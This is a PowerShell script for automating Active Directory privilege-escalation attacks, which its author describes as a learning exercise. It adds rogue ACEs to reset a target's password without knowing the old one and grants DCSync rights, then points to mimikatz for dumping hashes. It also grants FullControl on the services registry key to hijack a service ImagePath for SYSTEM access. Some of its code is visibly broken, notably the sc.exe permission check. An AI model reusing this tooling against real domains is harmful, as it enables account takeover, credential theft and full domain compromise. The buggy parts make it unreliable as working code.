<# --> This is a rookie and simple script for automating ACL attacks and service registry Imagepath hijacking.
   --> This script is not perfect, I just wanted to write something using powershell.
   --> As a information security enthusiast I was learning active directory exploitation and was working on ACLs 
       and registry modifications, so I thought about automating these attack vectors so that I can understand them
       better.
   

#>



function AddUser-Priv {
 
 [CmdletBinding()] Param(
   
    [Parameter(Mandatory=$false)]
    [Switch] $Add, 
    
    [Parameter(Mandatory=$true)]
    [String] $SamAccountName,       
 
    [Parameter(Mandatory=$false)]
    [String] $DistinguishedName,

    [Parameter(Mandatory=$true)]
    [String] $GroupName,

    [Parameter(Mandatory=$false)]
    [Switch] $Remove

 
 )
 
 if($Add) {
 
 <# Check if the group has the user already#>
    
 $group_check = Get-ADGroup -Identity $GroupName -Properties * | Select-Object -Property Members
 if($group_check.Members -match $SamAccountName) {

    Write-Warning "User $SamAccountName already exists in group $GroupName!" 

 }
 else {
 
    Add-ADGroupMember -Identity $GroupName -Members $SamAccountName
    Write-Host "User $SamAccountName added to $GroupName successfully!" -ForegroundColor Green -BackgroundColor Black
 
} 
}
    
if($Remove) {

    Write-Host "<-----------  ACL removal phase  ----------->"

    Remove-ADGroupMember -Identity $GroupName -Members $SamAccountName -Confirm:$false
    Write-Host "User $SamAccountName has been removed from group $GroupName" -ForegroundColor Red -BackgroundColor Black
    
}
} 

 

 AddUser-Priv -Remove -SamAccountName mrash -GroupName Administrators

 

 function SetUser-ACL {
 
    <# We are creating a new rogue ACE entry which will grant us GenericAll rights on target user#>

    <# Switch statement "Check" to check if ActiveDirectory Module is installed#>
    
    <# Remove flag which will remove the ACE entry#>

    <# WriteProperty on a user to change the logon script of that user with object type Script-Path #>
    

[CmdletBinding()] Param(


    [Parameter(Mandatory=$false)]
    [Switch] $check,
    
    [Parameter(Mandatory=$true)]
    [String] $TargetSamAccountName,
    
    [Parameter(Mandatory=$true)]
    [ValidateSet("GenericAll","WriteDacl")]
    [String] $Right,

    [Parameter(Mandatory=$false)]
    [ValidateSet("ResetPassword","DcSync")]
    [String] $ExtendedRight,

    [Parameter(Mandatory=$true)]
    [String] $UserSamAccountName = [System.Environment]::GetEnvironmentVariable("username"),

    [Parameter(Mandatory=$false)]
    [Switch] $Remove

 
)


if($check) {

    $module = Get-Module -All | Select-Object -Property Name

    if($module -match "ActiveDirectory") {
        
        Write-Host "ActiveDirectory Module exists!" -ForegroundColor Green -BackgroundColor Black  
    
    } else {
        
        Import-Module "ActiveDirectory"
        Write-Host "ActiveDirectory module imported successfully!" -ForegroundColor Green -BackgroundColor Black
    
    }
}


if($TargetSamAccountName){

    $DistinguishedName = (Get-ADUser -Identity $TargetSamAccountName -Properties *).DistinguishedName
}
 
 $user_name = (New-Object System.Security.Principal.NTAccount("$UserSamAccountName")).Translate([System.Security.Principal.SecurityIdentifier])
 $user_sid = $user_name.Value
 $path = "AD:$DistinguishedName"
 $TargetUser_ACL = get-acl -path $path

<# Start of the rights assigning and other functions#>


switch($Right) {

'GenericAll' {

    while($Right -eq 'GenericAll' -and $ExtendedRight -eq 'ResetPassword'){

        $adsi_mod = [ADSI]"LDAP://'$DistinguishedName'"
        $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule($user_name,'GenericAll','Allow')
        $TargetUser_ACL.AddAccessRule($ace)
        Set-Acl -path $path -AclObject $TargetUser_ACL
        Write-Host "Access Rule set in $TargetSamAccountName ACL!" -ForegroundColor Green -BackgroundColor Black
        
        <# Changing the password fo target user without knowing the previuosly set password #>

        $password = Read-Host "Enter the password you desire " | ConvertTo-SecureString -AsPlainText -Force
        Set-ADAccountPassword -Identity $TargetSamAccountName -NewPassword $password
        Write-Host "Password is changed for $TargetSamAccountName successfully!" -ForegroundColor Green -BackgroundColor Black
        break

    }
    } 

'WriteDacl' {

    while($Right -eq 'WriteDacl' -and $ExtendedRight -eq 'DcSync') {
    
        Write-Warning "You will need PowerView script to continue, if imported ignore this message :-)"
        $adsi_mod = [ADSI]"LDAP://'$DistinguishedName'"
        $ace2 = New-Object DirectoryServices.ActiveDirectoryAccessRule($user_name,'WriteDacl','Allow')
        $TargetUser_ACL.AddAccessRule($ace2)
        Set-Acl -path $path -AclObject $TargetUser_ACL
        
        <# Setting DcSync rights #>

        Add-ObjectAcl -PrincipalIdentity $TargetSamAccountName -Rights DCSync
        Write-Host "Access Rule Set in $TargetSamAccountName ACL for DcSync Rights!" -ForegroundColor Green -BackgroundColor Black
        Write-Host "You can use mimikatz to dump hashes using command : ("lsadump::dcsync /user:$TargetSamAccountName")" -ForegroundColor Green -BackgroundColor Black
        break
   }
   }
}
 

 if($Remove) {
       
        Write-Host "<-----------  ACL removal phase  ----------->"

        $removed_acl = $TargetUser_ACL.RemoveAccessRule($ace2)  
        $removed_acl2 = Remove-DomainObjectAcl -PrincipalIdentity $TargetSamAccountName -Rights DCSync
        Write-Host "ACL WriteDacl on $TargetSamAccountName and DcSync rights have been removed!" -ForegroundColor Red -BackgroundColor Black    
} 
}

<# SetUser-ACL -UserSamAccountName rloveless -TargetSamAccountName snell -Right GenericAll -ExtendedRight ResetPassword #>



function SetUserRegistry-ACL{

<# Registry Services ImagePath Hijacking #>

<# --> In this function we create an ACL for target user account where that user will have FullControl rights over the service registry ie "HKLM:\System\CurrentControlSet\Services". 
   --> This will allow user to change the image path of certain services where they run manually instead of startup. 
   --> These services if exploited will run user specified binaries instead of their regular services. #>

<# --> This function is used to get SYSTEM level access with Admin privileges. Here you need to select target user as user which has interactive logon rights locally.#>
<# --> You can search logon locally user using GroupPolicy settings " GPM -> Domains -> Domain Controller -> Default Domain Controller Policy -> Edit (Opens up default DC policy window) 
       Computer Configuration -> Policies -> Windows settings -> Security Settings -> User Rights Management -> Allow Logon Locally  #>


[CmdletBinding()] Param(


    
    [Parameter(Mandatory=$true)]
    [String] $TargetSamAccountName,
    
    [Parameter(Mandatory=$true)]
    [ValidateSet("FullControl")]
    [String] $Right,

    [Parameter(Mandatory=$true)]
    [String] $UserSamAccountName = [System.Environment]::GetEnvironmentVariable("username"),

    [Parameter(Mandatory=$false)]
    [Switch] $Remove


)

<# Set ACL for target user in registry services #>

if($TargetSamAccountName) {


    $username = New-Object System.Security.Principal.NTAccount($TargetSamAccountName)
    $username_sid = ($username.Translate([System.Security.Principal.SecurityIdentifier])).Value


}


switch($Right) {


'FullControl' {

    while($Right -eq 'FullControl') {

        Write-Warning "Select a user which has logon rights locally or allow target user to logon locally."
        $reg_service_acl = (Get-Acl -path 'HKLM:\System\CurrentControlSet\Services')
        $user_right = [System.Security.AccessControl.RegistryRights]::FullControl
        $reg_rule = New-Object System.Security.AccessControl.RegistryAccessRule($username,$user_right,'Allow')
        $reg_service_acl.AddAccessRule($reg_rule)
        $reg_service_acl | Set-Acl -Path 'HKLM:\System\CurrentControlSet\Services'
        Write-Host "ACE has been written in service registry ACL for $TargetSamAccountName!" -ForegroundColor Green -BackgroundColor Black

        <# Now we search for services which have Objectname as 'LocalSystem' which run as local user on local system you are logged in
           And Start property as '3' which describes that service has to be started manually by user, you can also use start property as '2' to run automatically, then select pschildname from these 
           services.
         #>
        
        $reg_services = Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Services\*'
        $reg_all_names = $reg_services | Where-Object {($_.Objectname -eq 'LocalSystem') -and ($_.Start -eq 3)} 
        $services = $reg_all_names.pschildname
        
        <# To start a registry service we need 'RP' i.e read property permission, using 'for' loop we check for services which have 'RP' in their sddl strings.#>
        <# We also user sc.exe which is a binary called service controller to check the sddl strings of services#>

        foreach($names in $services) {
        
            $service_names_sddl = sc.exe sdshow $services -match "RP[A-Z]*?;;;AU"{ $services  }
        }
    
        if($names -ne $null) {
        
            Write-Host "You can use this service '$names' to change its imagepath and point to your binary using cmdlet Set-ItemProperty " -ForegroundColor Green -BackgroundColor Black -

            <# Change the ImagePath property of obtained service and point that to your binary, below is one such example.#>

            <#  Set-ItemProperty -path 'HKLM:\System\CurrentControlSet\Services\XblGameSave' -name ImagePath -value "C:\Users\ApacheSVC\Desktop\PsExec.exe \\CLIENT cmd.exe"  #>


            Write-Host "After pointing ImagePath to binary, start the $names service with 'sc.exe start $names' " -ForegroundColor Green -BackgroundColor Black
            break

        }

}
}
}


if($Remove) {

    Write-Host "<-----------  ACL removal phase  ----------->"

    $removed_reg_acl = $reg_service_acl.RemoveAccessRule($reg_rule)
    Write-Host "Registry ACL for $TargetSamAccountName has been removed!" -ForegroundColor Red -BackgroundColor Black

}
}

 
<# SetUser-ACL -UserSamAccountName rloveless -TargetSamAccountName snell -Right WriteDacl -ExtendedRight DcSync -Remove #>

<# SetUserRegistry-ACL -userSamAccountname rloveless -targetSamaccountname snell -right FullControl -Remove #>



